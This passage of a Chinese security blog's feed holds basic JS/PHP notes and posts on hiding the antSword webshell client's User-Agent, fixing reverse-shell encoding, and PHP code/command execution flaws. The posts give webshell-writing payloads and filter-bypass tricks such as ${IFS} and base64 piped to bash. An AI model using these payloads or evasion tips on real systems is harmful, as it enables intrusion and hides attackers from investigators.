<li>引用方式：<br><code>&lt;script src=&quot;http://192.168.239.139/myScript.js&quot;&gt;&lt;/script&gt;</code></li>
</ol>
<h3 id="五、输出方式"><a href="#五、输出方式" class="headerlink" title="五、输出方式"></a>五、输出方式</h3><h4 id="弹出警告框"><a href="#弹出警告框" class="headerlink" title="弹出警告框"></a>弹出警告框</h4><p>使用 <code>window.alert()</code> 弹出警告框。（<code>window.</code>可以不写，直接写<code>alert</code>，<code>alert</code>括号中如果是数字不需要加引号，如果是字符串，需要加引号）</p>
<p>写到HTML文档中<br>  使用 document.write() 方法将内容写到 HTML 文档中。</p>
<p>写到HTML元素中<br>  使用 innerHTML 写入到 HTML 元素。</p>
<h3 id="六、变量"><a href="#六、变量" class="headerlink" title="六、变量"></a>六、变量</h3><ol>
<li><p>用var声明变量</p>
</li>
<li><p>驼峰命名变量：</p>
<p> 大驼峰（每个单词首字母大写，其他字母小写），</p>
<p> 小驼峰（第一个单词全部小写，后面单词首字母大写）</p>
</li>
</ol>
<h3 id="七、注释"><a href="#七、注释" class="headerlink" title="七、注释"></a>七、注释</h3><p>单行注释：//<br>多行注释：/*  */</p>
<h3 id="八、大小写敏感"><a href="#八、大小写敏感" class="headerlink" title="八、大小写敏感"></a>八、大小写敏感</h3><h3 id="九、数组"><a href="#九、数组" class="headerlink" title="九、数组"></a>九、数组</h3><h4 id="一、定义方式"><a href="#一、定义方式" class="headerlink" title="一、定义方式"></a>一、定义方式</h4><p>1: 直接赋值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var names &#x3D; [“zhangsan&quot;, “li&quot;, “wangwu&quot;];</span><br><span class="line">var names &#x3D; [12, 23, 45, 56];</span><br></pre></td></tr></table></figure>
<p>2:先new再赋值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var cars&#x3D;new Array();</span><br><span class="line">cars[0]&#x3D;&quot;Saab&quot;;</span><br><span class="line">cars[1]&#x3D;&quot;Volvo&quot;;</span><br><span class="line">cars[2]&#x3D;&quot;BMW&quot;;</span><br></pre></td></tr></table></figure>
<p>3:new的时候直接赋值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var cars&#x3D;new Array(&quot;Saab&quot;,&quot;Volvo&quot;,&quot;BMW&quot;);</span><br></pre></td></tr></table></figure>
<h3 id="十、对象"><a href="#十、对象" class="headerlink" title="十、对象"></a>十、对象</h3><p>一、定义对象：</p>
<p>单行定义：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var person &#x3D; &#123;firstName:&quot;Bill&quot;, lastName:&quot;Gates&quot;, age:62, eyeColor:&quot;blue&quot;&#125;;</span><br></pre></td></tr></table></figure>
<p>多行定义：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var person &#x3D; &#123;</span><br><span class="line">    firstName:&quot;Bill&quot;,</span><br><span class="line">    lastName:&quot;Gates&quot;,</span><br><span class="line">    age:62,</span><br><span class="line">    eyeColor:&quot;blue&quot;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>二、访问对象属性</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">person.lastName;</span><br></pre></td></tr></table></figure>
<p>三、访问对象方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">person.fullName();</span><br></pre></td></tr></table></figure>
<h3 id="十一、if选择结构"><a href="#十一、if选择结构" class="headerlink" title="十一、if选择结构"></a>十一、if选择结构</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (condition1)</span><br><span class="line">&#123;</span><br><span class="line">    当条件 1 为 true 时执行的代码</span><br><span class="line">&#125;</span><br><span class="line">else if (condition2)</span><br><span class="line">&#123;</span><br><span class="line">    当条件 2 为 true 时执行的代码</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">  当条件 1 和 条件 2 都不为 true 时执行的代码</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="十二、switch选择结构"><a href="#十二、switch选择结构" class="headerlink" title="十二、switch选择结构"></a>十二、switch选择结构</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">switch(n)</span><br><span class="line">&#123;</span><br><span class="line">    case 1:</span><br><span class="line">        执行代码块 1</span><br><span class="line">        break;</span><br><span class="line">    case 2:</span><br><span class="line">        执行代码块 2</span><br><span class="line">        break;</span><br><span class="line">    default:</span><br><span class="line">        与 case 1 和 case 2 不同时执行的代码</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="十三、for循环"><a href="#十三、for循环" class="headerlink" title="十三、for循环"></a>十三、for循环</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for( i&#x3D;0;i&lt;cars.length;i++)</span><br><span class="line">&#123;</span><br><span class="line">   var value &#x3D; cars[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="十四、for-in遍历"><a href="#十四、for-in遍历" class="headerlink" title="十四、for in遍历"></a>十四、for in遍历</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var person&#x3D;&#123;fname:&quot;John&quot;,lname:&quot;Doe&quot;,age:25&#125;; </span><br><span class="line"> </span><br><span class="line">for (x in person)  &#x2F;&#x2F; x 为属性名</span><br><span class="line">&#123;</span><br><span class="line">    txt&#x3D;txt + person[x];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="十五、while循环"><a href="#十五、while循环" class="headerlink" title="十五、while循环"></a>十五、while循环</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">while (条件)</span><br><span class="line">&#123;</span><br><span class="line">    需要执行的代码</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="十六、do-while循环"><a href="#十六、do-while循环" class="headerlink" title="十六、do while循环"></a>十六、do while循环</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">do</span><br><span class="line">&#123;</span><br><span class="line">    需要执行的代码</span><br><span class="line">&#125;</span><br><span class="line">while (条件);</span><br></pre></td></tr></table></figure>
<p>和前者相比，区别为：当调节不满足，<code>do while</code>循环也至少会执行一次循环体，<code>while</code>则一次不执行</p>
<h3 id="十七、dom"><a href="#十七、dom" class="headerlink" title="十七、dom"></a>十七、dom</h3><p><code>DOM</code> 是 <code>Document Object Model</code>（<strong>文档对象模型</strong>）的缩写</p>
<h3 id="十八、-访问-HTML-元素（节点）"><a href="#十八、-访问-HTML-元素（节点）" class="headerlink" title="十八、  访问 HTML 元素（节点）"></a>十八、  访问 HTML 元素（节点）</h3><p>通过使用 <code>getElementById()</code> 方法</p>
<p>通过使用 <code>getElementsByTagName()</code> 方法</p>
<h2 id="八、PHP-1"><a href="#八、PHP-1" class="headerlink" title="八、PHP"></a>八、PHP</h2><h3 id="1-删除变量"><a href="#1-删除变量" class="headerlink" title="1.删除变量"></a>1.删除变量</h3><p><code>unset</code></p>
<h3 id="2-常量定义"><a href="#2-常量定义" class="headerlink" title="2.常量定义"></a>2.常量定义</h3><ol>
<li>使用定义常量的函数：define(‘常量名’,常量值);</li>
<li>5.3之后才有的：const 常量名 = 值;</li>
</ol>
<h3 id="3-数据类型"><a href="#3-数据类型" class="headerlink" title="3.数据类型"></a>3.数据类型</h3><ul>
<li><p>简单（基本）数据类型</p>
<ul>
<li><p>整型：int/integer，系统分配4个字节存储，、</p>
</li>
<li><p>浮点型：float/double，系统分配8个字节存储，、</p>
</li>
<li><p>字符串型：string，系统根据实际长度分配，、</p>
</li>
<li><p>布尔类型：bool/boolean，表示布尔类型，只有两个值：true和false</p>
</li>
</ul>
</li>
<li><p>复合数据类型</p>
<ul>
<li><p>对象类型：object，存放对象（面向对象）</p>
</li>
<li><p>数组类型：array，存储多个数据（一次性）</p>
</li>
</ul>
</li>
<li><p>特殊数据类型</p>
<ul>
<li><p>资源类型：resource，存放资源数据（PHP外部数据，如数据库、文件）</p>
</li>
<li><p>空类型：NULL，只有一个值就是NULL（不能运算）</p>
</li>
</ul>
</li>
</ul>
<h3 id="4-类型转换"><a href="#4-类型转换" class="headerlink" title="4.类型转换"></a>4.类型转换</h3><ul>
<li><p>自动转换：系统根据需求自己判定，自己转换。</p>
</li>
<li><p>强制（手动）转换：人为根据需要的目标类型转换<br>强制转换规则：在变量之前增加一个括号()，然后在里面写上对应类型。</p>
</li>
<li><p>字符串转数值有自己的规则</p>
<ol>
<li>以字母开头的字符串，永远为0；</li>
<li>以数字开头的字符串，取到碰到字符串为止（不会同时包含两个小数点）</li>
</ol>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">settype(变量名,类型)：设定数据类型，改变原始数据</span><br></pre></td></tr></table></figure>

<h4 id="5-不同进制整数表示"><a href="#5-不同进制整数表示" class="headerlink" title="5.不同进制整数表示"></a>5.不同进制整数表示</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a &#x3D; 120;		&#x2F;&#x2F;10进制</span><br><span class="line">$a&#x3D;0b110;	&#x2F;&#x2F;2进制</span><br><span class="line">$a&#x3D;0120;		&#x2F;&#x2F;8进制</span><br><span class="line">$a&#x3D;0x120;	&#x2F;&#x2F;16进制</span><br></pre></td></tr></table></figure>

<p>类型转换函数：</p>
<ul>
<li>decbin()：十进制转二进制</li>
<li>decoct()：十进制转八进制</li>
<li>dechex()：十进制转十六进制</li>
<li>bindec()：二进制转十进制</li>
</ul>
<h4 id="6-empty-和isset"><a href="#6-empty-和isset" class="headerlink" title="6.empty()和isset()"></a>6.empty()和isset()</h4><ul>
<li>empty()：判断数据的值是否为“空”，不是NULL，如果为空返回true，不为空返回false</li>
<li>isset()：判断数据存储的变量本身是否存在，存在变量返回true，不存在返回false</li>
</ul>
<h4 id="7-计算机码及位运算"><a href="#7-计算机码及位运算" class="headerlink" title="7.计算机码及位运算"></a>7.计算机码及位运算</h4><blockquote>
<p>计算机码：原码、反码和补码，数值本身最左边一位是用来充当符号位：正数为0，负数为1</p>
</blockquote>
<ul>
<li>原码：数据本身从十进制转换成二进制得到的结果<ul>
<li>正数：左边符号位为0（正数的原码、反码和补码就是原码本身）</li>
<li>负数：左边符号位为1</li>
</ul>
</li>
<li>反码：针对负数，符号位不变，其他位取反</li>
<li>补码：针对负数，反码+1</li>
</ul>
<p>位运算：取出计算机中最小的单位（位bit）进行运算<br>|符号|意义<br>|–|–|<br>|&amp;|按位与，两个位都为1，结果为1，否则为0<br>|||按位或，两个有一个为1，结果为1<br>|~|按位非，一个位如果为1则变成0，否则反之<br>|^|按位异或，两个相同则为0，不同则为1<br>|&lt;&lt;|按位左移，整个位（32位），向左移动一位，右边补0<br>|&gt;&gt;|按位右移，整个位向右移动一位，左边补符号位对应内容（正数补0，负数补1）</p>
<ul>
<li>注意：<ol>
<li>系统进行任何位运算的时候都是使用的补码</li>
<li>运算结束之后都必须将补码转换成原码才是最终要显示的数据</li>
</ol>
</li>
</ul>
<h3 id="8-流程控制替代语法"><a href="#8-流程控制替代语法" class="headerlink" title="8.流程控制替代语法"></a>8.流程控制替代语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if：if():    endif;</span><br><span class="line">switch：switch():   endswitch;</span><br><span class="line">for:  for:      endfor;</span><br><span class="line">while   while:    endwhile;</span><br><span class="line">foreach   foreach:    endforeach;</span><br></pre></td></tr></table></figure>

<h3 id="9-数组"><a href="#9-数组" class="headerlink" title="9.数组"></a>9.数组</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sort()：顺序排序（下标重排）</span><br><span class="line">rsort()：逆序排序</span><br><span class="line">asort()：顺序排序（下标保留）</span><br><span class="line">arsort()：逆序排序</span><br><span class="line">ksort()：顺序排序：按照键名（下标）(保留下标)</span><br><span class="line">krsort()：逆序排序</span><br><span class="line">shuffle()：随机打乱数组元素，数组下标会重排</span><br><span class="line">reset()：重置指针，将数组指针回到首位</span><br><span class="line">end()：重置指针，将数组指针指导最后一个元素</span><br><span class="line">next()：指针下移，取得下一个元素的值</span><br><span class="line">prev()：指针上移，取得上一个元素的值</span><br><span class="line">current()：获取当前指针对应的元素值</span><br><span class="line">key()：获取当前指针对应的下标值</span><br><span class="line">count()：统计数组中元素的数量</span><br><span class="line">array_push()：往数组中加入一个元素（数组后面）</span><br><span class="line">array_pop()：从数组中取出一个元素（数组后面）</span><br><span class="line">array_shift()：从数组中取出一个元素（数组前面）</span><br><span class="line">array_unshift()：从数组中加入一个元素（数组前面）</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Note</category>
      </categories>
  </entry>
  <entry>
    <title>蚁剑修改默认User-Agent</title>
    <url>/2020/09/25/%E8%9A%81%E5%89%91%E4%BF%AE%E6%94%B9%E9%BB%98%E8%AE%A4User-Agent/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>摸鱼ing</p>
<a id="more"></a>

<p>蚁剑不修改User-Agent的话，默认是antSword/v2.1，这实在是太憨批了，这不摆明告诉了别人溯源大手子说：嘿，我用了蚁剑，快来溯源我！</p>
<p>所以还是要做些隐藏手段的，虽然蚁剑能在管理shell中添加自定义的header字段，但是总感觉没有修改客户端参数方便。</p>
<h2 id="修改办法"><a href="#修改办法" class="headerlink" title="修改办法"></a>修改办法</h2><p>修改以下两个文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">antSword&#x2F;modules&#x2F;request.js</span><br><span class="line">antSword&#x2F;modules&#x2F;update.js</span><br></pre></td></tr></table></figure>

<h3 id="request-js"><a href="#request-js" class="headerlink" title="request.js"></a>request.js</h3><p><img src="https://images.atsud0.me/images/post/image-20200925171717468.png" alt="image-20200925171717468"></p>
<p>修改第21行的const USER_AGENT</p>
<h3 id="update-js"><a href="#update-js" class="headerlink" title="update.js"></a>update.js</h3><p>153行和165行的.set(‘User-Agent’)</p>
<p><img src="https://images.atsud0.me/images/post/image-20200925172003708.png" alt="image-20200925172003708"></p>
<p>参考：</p>
<ul>
<li><a href="https://xz.aliyun.com/t/4000" target="_blank" rel="noopener">从静态到动态打造一款免杀的antSword(蚁剑)</a></li>
</ul>
]]></content>
      <categories>
        <category>Note</category>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>antSword</tag>
      </tags>
  </entry>
  <entry>
    <title>解决reverse-shell中的乱码问题</title>
    <url>/2020/11/02/%E8%A7%A3%E5%86%B3reverse-shell%E4%B8%AD%E7%9A%84%E4%B9%B1%E7%A0%81%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>参考链接：<a href="https://mp.weixin.qq.com/s/9hyWeoo8Vn1i-whG9cjDKQ" target="_blank" rel="noopener">Meterpreter中文乱码的解决</a></p>
<a id="more"></a>

<p>直接主题。</p>
<h2 id="rlwrap-解决特俗按键乱码"><a href="#rlwrap-解决特俗按键乱码" class="headerlink" title="rlwrap 解决特俗按键乱码"></a>rlwrap 解决特俗按键乱码</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt install rlwrap</span><br></pre></td></tr></table></figure>

<p>启动</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rlwrap nc -lvnp 1234</span><br><span class="line">rlwrap msfconsole</span><br></pre></td></tr></table></figure>

<p>通过<code>rlwrap</code>开的nc或者是msfconsole获得的shell，不会再用按上下左右出现特殊按键的烦恼。。贼强，</p>
<h2 id="chcp命令解决中文乱码"><a href="#chcp命令解决中文乱码" class="headerlink" title="chcp命令解决中文乱码"></a><strong>chcp命令解决中文乱码</strong></h2><p>cmd执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chcp 65001</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Note</category>
      </categories>
  </entry>
  <entry>
    <title>代码-命令执行漏洞</title>
    <url>/2020/05/30/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p><code>remote command/code execute</code>远程命令/代码执行简称RCE。远程代码执行，不仅会出现在php也会出现在java,python等编程语言中。</p>
<p>远程代码执行漏洞的产生原因</p>
<ul>
<li>对用户输入过滤不严,用户可以通过请求将代码注入到应用中由服务器执行<a id="more"></a>

</li>
</ul>
<h2 id="php代码执行漏洞相关函数"><a href="#php代码执行漏洞相关函数" class="headerlink" title="php代码执行漏洞相关函数"></a>php代码执行漏洞相关函数</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h3><p>eval()将字符串当作php代码执行.必须以分号结尾.(但是eval不是函数)</p>
<blockquote><p>Note: 因为是一个语言构造器而不是一个函数，不能被 可变函数 调用。 </p>
<footer><strong>eval</strong><cite><a href="https://www.php.net/manual/zh/function.eval.php" target="_blank" rel="noopener">eval函数php中文手册</a></cite></footer></blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$code=$_GET[<span class="string">'code'</span>];</span><br><span class="line"><span class="keyword">eval</span>($code);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><figcaption><span>eval_payload</span></figcaption><table><tr><td class="code"><pre><span class="line">?code&#x3D;eval($_POST[a]);</span><br></pre></td></tr></table></figure>

<h3 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h3><p>assert()会将字符串当作php代码执行,不需要以分号结尾.但是<code>assert</code>在php7中变成了一种语言结构,和eval函数一样,不支持可变函数调用.</p>
<blockquote><p>assert() is a language construct in PHP 7, allowing for the definition of expectations: assertions that take effect in development and testing environments, but are optimised away to have zero cost in production. </p>
<footer><strong>assert</strong><cite><a href="https://www.php.net/manual/zh/function.assert" target="_blank" rel="noopener">assert函数php中文手册</a></cite></footer></blockquote>


<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$code=$_GET[<span class="string">'code'</span>];</span><br><span class="line">assert($code);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><figcaption><span>assert_payload</span></figcaption><table><tr><td class="code"><pre><span class="line">?code&#x3D;fwrite(fopen(&#39;shell.php&#39;,&#39;a+&#39;),&#39;&lt;?php eval($_POST[a])?&gt;&#39;)</span><br></pre></td></tr></table></figure>

<h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a>preg_replace</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">preg_replace($pattern,$replacement.$subject)</span><br></pre></td></tr></table></figure>

<p>当第一个参数使用e修饰符,第二个参数的值会被当成php代码执行<br>如</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$code=$_GET[<span class="string">'code'</span>];</span><br><span class="line">$str=preg_replace(<span class="string">"/\[(.*)\]/e"</span>,<span class="string">'\\1'</span>, $code);</span><br><span class="line">$print($str);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><figcaption><span>preg_replace_payload</span></figcaption><table><tr><td class="code"><pre><span class="line">?code&#x3D;[eval($_POST[a])]</span><br></pre></td></tr></table></figure>

<h3 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func"></a>call_user_func</h3><p>call_user_func()函数<br><code>call_user_func($callback,$parameter)</code><br>$callback是一个被调用的函数,其余参数是被调用函数的参数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$function=$_GET[<span class="string">'fun'</span>];</span><br><span class="line">$parameter=$_GET[<span class="string">'para'</span>];</span><br><span class="line">call_user_func($function,$parameter);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><figcaption><span>call_user_func_payload</span></figcaption><table><tr><td class="code"><pre><span class="line">?fun&#x3D;assert&amp;para&#x3D;fwrite(fopen(&#39;shell.php&#39;,&#39;a+&#39;),&#39;&lt;?php eval($_POST[a])?&gt;&#39;)</span><br></pre></td></tr></table></figure>


<h3 id="a-b-动态函数"><a href="#a-b-动态函数" class="headerlink" title="$a($b)动态函数"></a>$a($b)动态函数</h3><p>动态函数<code>$a($b)</code>和<code>call_user_func()</code>利用方法一样.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a=$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=$_GET[<span class="string">'b'</span>];</span><br><span class="line">a($b);</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><figcaption><span>call_user_func_payload</span></figcaption><table><tr><td class="code"><pre><span class="line">?a&#x3D;assert&amp;b&#x3D;fwrite(fopen(&#39;shell.php&#39;,&#39;a+&#39;),&#39;&lt;?php eval($_POST[a])?&gt;&#39;)</span><br></pre></td></tr></table></figure>


<p>防御方式:</p>
<ul>
<li>不使用eval等函数</li>
<li>过滤</li>
<li>更新php版本</li>
<li>在php配置文件中禁用危险函数 <code>disable_function</code>=phpinfo…等函数,但是eval无法禁用,因为eval不是函数</li>
<li>preg_replace弃用/e修饰符</li>
</ul>
<p>代码执行漏洞利用</p>
<ol>
<li>get_webshell</li>
<li>print <code>__FILE__</code> //获取当前文件的绝对路径</li>
<li>print file_get_contents(‘C:\Windows\System32\drivers\etc\hosts’)读文件(能否读文件,具体还是得看web用户的权限)</li>
<li>file_put_contents(‘文件名’,’内容’)写文件</li>
</ol>
<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>造成原因:</p>
<ul>
<li>过滤不严</li>
<li>系统漏洞造成命令注入</li>
<li>调用的第三方组建存在代码执行漏洞</li>
</ul>
<p>危害:</p>
<ul>
<li>继承web用户权限</li>
<li>读写文件</li>
<li>反弹shell</li>
<li>控制网站/服务器</li>
</ul>
<h3 id="命令执行漏洞相关函数"><a href="#命令执行漏洞相关函数" class="headerlink" title="命令执行漏洞相关函数"></a>命令执行漏洞相关函数</h3><h4 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h4><p>不会输出结果,而是返回结果的最后一行.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=$_GET[<span class="string">'a'</span>];</span><br><span class="line"><span class="keyword">echo</span> exec($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<h4 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h4><p>成功输出结果并返回结果的最后一行,失败返回<code>False</code>.</p>
<h4 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h4><p>函数实际上是反引号的实体(`),不输出结果,返回执行结果.</p>
<h4 id="反引号"><a href="#反引号" class="headerlink" title="反引号``"></a>反引号``</h4><p>和<code>shell_exec</code>一样,不输出结果,返回执行结果.</p>
<h4 id="passthru"><a href="#passthru" class="headerlink" title="passthru"></a>passthru</h4><p>直接将结果输出到浏览器,不返回任何值,而且可以输出二进制结果.</p>
<h4 id="popen-command-mode"><a href="#popen-command-mode" class="headerlink" title="popen(command,mode)"></a>popen(command,mode)</h4><p>使用command打开进程文件指针,将字符串作为系统命令执行,但是函数既不输出结果也不返回命名结果,而是返回一个文件命令指针.</p>
<p>command-需要执行的命令<br>mode(r/x) 规定连接模式,r只读,x只写</p>
<figure class="highlight plain"><figcaption><span>popen_payload</span></figcaption><table><tr><td class="code"><pre><span class="line">?a&#x3D;echo ^&lt;?php phpinfo()?^&gt; &gt; shell.php </span><br></pre></td></tr></table></figure>
<p>windows<code>cmd</code>里面的转义符号是<code>^</code>号</p>
<h4 id="命令连接符"><a href="#命令连接符" class="headerlink" title="命令连接符"></a>命令连接符</h4><table>
<thead>
<tr>
<th>符号</th>
<th>系统支持</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>|</td>
<td>Windows&amp;Linux</td>
<td>管道符</td>
</tr>
<tr>
<td>||</td>
<td>Windows&amp;Linux</td>
<td></td>
</tr>
<tr>
<td>&amp;</td>
<td>Windows&amp;Linux</td>
<td>不管右边的命令是否执行成功,都会执行左边的命令</td>
</tr>
<tr>
<td>&amp;&amp;</td>
<td>Windows&amp;Linux</td>
<td>只有右边的命令执行成功后,才会执行左边的命令</td>
</tr>
<tr>
<td>;</td>
<td>Linux</td>
<td>执行完左边的命令后,执行右边的命令</td>
</tr>
</tbody></table>
<p>防御</p>
<ul>
<li>减少命令执行函数的使用,并警用</li>
<li>对参数进行过滤</li>
<li>参数引号包裹</li>
<li>更新php版本</li>
</ul>
<h2 id="命令和代码执行的本质"><a href="#命令和代码执行的本质" class="headerlink" title="命令和代码执行的本质"></a>命令和代码执行的本质</h2><p>用了相关的函数，却存在可以被用户动态控制的变量。能被用户动态控制的变量，却不严格过滤用户的输入。</p>
<p>两者的区别:</p>
<ul>
<li>代码执行，执行代码执行的语句</li>
<li>命令执行，直接执行操作系统命令</li>
<li>命令执行，特殊的代码执行,只是执行的语句是具有执行命令能力的函数</li>
</ul>
<h2 id="一些绕过方法"><a href="#一些绕过方法" class="headerlink" title="一些绕过方法"></a>一些绕过方法</h2><h3 id="Linux的命令执行中当空格被过滤"><a href="#Linux的命令执行中当空格被过滤" class="headerlink" title="Linux的命令执行中当空格被过滤"></a>Linux的命令执行中当空格被过滤</h3><h4 id="IFS-代替空格-bash"><a href="#IFS-代替空格-bash" class="headerlink" title="${IFS}代替空格(bash)"></a>${IFS}代替空格(bash)</h4><p>类似于这个靶机的情况:<a href="/2020/06/14/Vulnhub-Dmv/" title="Vulnhub-Dmv-1">Vulnhub-Dmv-1</a></p>
<p>使用${IFS}代替空格。</p>
<ul>
<li><a href="https://www.cnblogs.com/cocowool/archive/2013/01/15/2861904.html" title="" target="">shell:处理文件中的空格</a>

</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat$&#123;IFS&#125;1.php</span><br></pre></td></tr></table></figure>

<h4 id="lt-gt-重定向符代替"><a href="#lt-gt-重定向符代替" class="headerlink" title="&lt;&gt;重定向符代替"></a>&lt;&gt;重定向符代替</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat&lt;&gt;1.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat&lt;1.php</span><br></pre></td></tr></table></figure>


<h3 id="突破黑名单绕过"><a href="#突破黑名单绕过" class="headerlink" title="(突破黑名单绕过)"></a>(突破黑名单绕过)</h3><h4 id="拼接"><a href="#拼接" class="headerlink" title="拼接"></a>拼接</h4><p>假设目标禁止读取flag.php，则可以尝试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;flag</span><br><span class="line">b&#x3D;.php</span><br><span class="line">c&#x3D;mo</span><br><span class="line">d&#x3D;re</span><br><span class="line"></span><br><span class="line">$c$d $a$b</span><br></pre></td></tr></table></figure>

<h4 id="base64-编码"><a href="#base64-编码" class="headerlink" title="base64 编码"></a>base64 编码</h4><p>将解码后的参数传递给bash</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;cat flag.php&#39;|base64</span><br><span class="line">Y2F0IGZsYWcucGhwCg&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">echo &#39;Y2F0IGZsYWcucGhwCg&#x3D;&#x3D;&#39;|base64 -d|bash</span><br><span class="line">!!flag</span><br></pre></td></tr></table></figure>

<p>使用反引号</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#96;echo &#39;Y2F0IGZsYWcucGhwCg&#x3D;&#x3D;&#39;|base64 -d&#96;</span><br></pre></td></tr></table></figure>

<p>$()</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$(echo &#39;Y2F0IGZsYWcucGhwCg&#x3D;&#x3D;&#39;|base64 -d)</span><br></pre></td></tr></table></figure>

<h4 id="使用单引号-双引号-反斜杠"><a href="#使用单引号-双引号-反斜杠" class="headerlink" title="使用单引号,双引号,反斜杠"></a>使用单引号,双引号,反斜杠</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#39;a&#39;t flag.php </span><br><span class="line">!!flag</span><br><span class="line"></span><br><span class="line">c&#39;a&#39;t fl&quot;a&quot;g.php</span><br><span class="line">!!flag</span><br><span class="line"></span><br><span class="line">ca\t flag.\php</span><br><span class="line">!!flag</span><br></pre></td></tr></table></figure>

<p>因为可以这样输出命令，所以可以将命令写入到一个文件中去，再去执行要执行的命令。如果限制长度的话，则可以一次只写一点，再写进去执行。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo \c\a\t\ f\l\a\g.php</span><br><span class="line">cat flag.php</span><br><span class="line"></span><br><span class="line">echo \c\a\t\ f\l\a\g.php &gt;4</span><br><span class="line"></span><br><span class="line">cat 4</span><br><span class="line">cat flag.php</span><br><span class="line"></span><br><span class="line">bash 4</span><br><span class="line">!!flag</span><br></pre></td></tr></table></figure>

<p>要注意的是引号要成对出现。并且单引号，双引号也能和``$()来配合使用</p>
